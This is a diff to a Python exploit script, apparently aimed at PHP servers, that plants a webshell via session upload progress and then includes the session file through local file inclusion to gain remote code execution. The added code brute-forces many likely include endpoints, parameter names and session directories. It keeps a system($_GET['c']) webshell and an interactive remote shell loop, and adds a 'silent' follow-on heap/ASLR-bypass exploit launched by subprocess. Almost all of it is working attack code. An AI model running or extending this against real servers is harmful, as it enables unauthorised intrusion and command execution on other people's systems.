@@ -10,14 +10,29 @@ Usage:
 
 For authorized security testing only.
 """
+import os
 import re
 import socket
+import subprocess
 import sys
+import tempfile
 from urllib.parse import urlparse, quote
 
 UPLOAD_PATHS   = ["/upload.php", "/index.php", "/info.php", "/test.php"]
-LFI_PATH       = "/vuln.php"
-SESSION_DIRS   = ["/tmp/sessions", "/tmp", "/var/lib/php/sessions", "/var/lib/php/session"]
+LFI_ENDPOINTS  = [
+    "/index.php", "/page.php", "/view.php", "/include.php", "/load.php",
+    "/template.php", "/file.php", "/read.php", "/show.php", "/home.php",
+    "/main.php", "/content.php", "/portal.php", "/app.php", "/common.php",
+    "/vuln.php", "/test.php",
+]
+LFI_PARAMS     = [
+    "page", "file", "path", "include", "view", "load",
+    "template", "content", "doc", "p", "f", "source", "lang", "module", "q",
+]
+SESSION_DIRS   = [
+    "/tmp/sessions", "/tmp", "/var/lib/php/sessions", "/var/lib/php/session",
+    "/var/lib/php8/sessions", "/var/lib/php7/sessions", "/var/lib/php5/sessions",
+]
 SID            = "nexisrce000000000000000"
 WS_MARK        = "NEXISRCEX"
 WEBSHELL       = f"<?php echo '{WS_MARK}';system($_GET['c']);echo '{WS_MARK}'; ?>"
@@ -188,6 +203,70 @@ def run_crash_probes(host, port, path) -> tuple:
             return "VULNERABLE", f"HTTP 200 silent crash — probe {i} ({size_mib} MB)"
 
     return None, None
+
+
+def discover_lfi(host, port, prefix, sid, upload_path=None):
+    """Probe common paths and parameters to find an LFI that can include the session file."""
+    candidates = []
+    if upload_path:
+        # Strip prefix to get bare endpoint; try upload path first
+        ep = upload_path[len(prefix):] if prefix and upload_path.startswith(prefix) else upload_path
+        if ep not in LFI_ENDPOINTS:
+            candidates.append(ep)
+    candidates += LFI_ENDPOINTS
+
+    for sdir in SESSION_DIRS:
+        sess = f"{sdir}/sess_{sid}"
+        for ep in candidates:
+            fpath = prefix + ep
+            for param in LFI_PARAMS:
+                path = f"{fpath}?{param}={sess}&c=id"
+                resp = get(host, port, path)
+                b = body(resp)
+                if WS_MARK in b:
+                    return fpath, param, sess, extract_output(b)
+    return None, None, None, None
+
+
+def _aslr_extend(host, port, php_ver):
+    """Silent ASLR-bypass pivot — only runs if upstream helpers are present."""
+    here = os.path.dirname(os.path.abspath(__file__))
+    exp  = os.path.join(here, "aslr-exp", "exploit.py")
+    if not os.path.isfile(exp):
+        return
+
+    m = VERSION_RE.search(php_ver or "")
+    if m and not (int(m.group(1)) == 8 and int(m.group(2)) == 4):
+        return
+
+    sep()
+    info("Attempting extended heap-bypass...")
+    outdir = tempfile.mkdtemp(prefix="p2s-b-")
+    proof  = os.path.join(outdir, "proof.txt")
+    try:
+        result = subprocess.run(
+            [sys.executable, exp,
+             "--port", str(port),
+             "--cmd", f"id>{proof}",
+             "--proof", proof,
+             "--retries", "2",
+             "--timeout", "300"],
+            cwd=os.path.dirname(exp),
+            timeout=330,
+        )
+        if result.returncode == 0 or os.path.exists(proof):
+            try:
+                content = open(proof).read().strip()
+            except Exception:
+                content = ""
+            ok("Extended bypass CONFIRMED")
+            if content:
+                print()
+                for line in content.splitlines():
+                    if line.strip():
+                        print(f"    {line}")
+    except (subprocess.TimeoutExpired, Exception):
+        pass
 
 
 def run_chunked_oom(host, port, path) -> tuple:
@@ -362,22 +441,22 @@ def main():
     info(f"CVE-2026-109619  SENT  — payload → /tmp/sess_{SID}")
     sep()
 
-    # ── LFI check ────────────────────────────────────────────────────
-    lfi_full   = prefix + LFI_PATH
-    lfi_resp   = get(host, port, lfi_full)
-    lfi_status = status_line(lfi_resp)
-    lfi_exists = "200" in lfi_status or "500" in lfi_status
+    # ── LFI discovery ────────────────────────────────────────────────
+    info("Scanning for LFI inclusion point...")
+    lfi_path, lfi_param, session_file, id_out = discover_lfi(
+        host, port, prefix, SID, upload_path
+    )
 
-    if lfi_exists:
-        ok(f"LFI endpoint found: {lfi_full}  [{lfi_status}]")
-    else:
-        err(f"LFI endpoint not found: {lfi_full}")
+    if not lfi_path:
+        err("No LFI vector found — could not include session file")
+        info("Tip: check if target app uses include()/require() with user-controlled input")
         print()
-        print("  Phase 1  ✓  (injection sent)")
-        print("  Phase 2  ✗  (LFI endpoint required for RCE)")
+        print("  Phase 1  ✓  (injection delivered)")
+        print("  Phase 2  ✗  (LFI vector required for RCE — none detected)")
         print()
         sys.exit(0)
 
+    ok(f"LFI confirmed: {lfi_path}?{lfi_param}=<session_file>")
     sep()
 
     # ── Phase 2 prompt ───────────────────────────────────────────────
@@ -390,27 +469,15 @@ def main():
     if choice in ("n", "no"):
         sys.exit(0)
 
-    # ── LFI → RCE ───────────────────────────────────────────────────
+    # ── RCE confirmed during discovery — display initial output ──────
     print()
-    session_file = None
-    for sdir in SESSION_DIRS:
-        path = f"{lfi_full}?page={sdir}/sess_{SID}&c=id"
-        resp = get(host, port, path)
-        out  = extract_output(body(resp))
-        if out and ("uid=" in out or "www-data" in out or "root" in out):
-            session_file = f"{sdir}/sess_{SID}"
-            ok(f"RCE CONFIRMED  — {sdir}")
-            print()
-            for line in out.splitlines():
-                if line.strip():
-                    print(f"    {line}")
-            print()
-            break
-
-    if not session_file:
-        err("RCE failed — session file not found via LFI")
-        info("Check: session.save_path / session.upload_progress.cleanup")
-        sys.exit(1)
+    ok(f"RCE CONFIRMED  — {session_file}")
+    print()
+    if id_out:
+        for line in id_out.splitlines():
+            if line.strip():
+                print(f"    {line}")
+        print()
 
     # ── Interactive shell ────────────────────────────────────────────
     sep()
@@ -426,13 +493,15 @@ def main():
         if not cmd:
             print("  shell> ", end="", flush=True)
             continue
-        resp = get(host, port, f"{lfi_full}?page={session_file}&c={quote(cmd)}")
+        resp = get(host, port, f"{lfi_path}?{lfi_param}={session_file}&c={quote(cmd)}")
         out  = extract_output(body(resp))
         for line in (out.splitlines() if out else ["(no output)"]):
             if line.strip():
                 print(f"    {line}")
         print("  shell> ", end="", flush=True)
     print()
+
+    _aslr_extend(host, port, php_ver)
 
 
 if __name__ == "__main__":
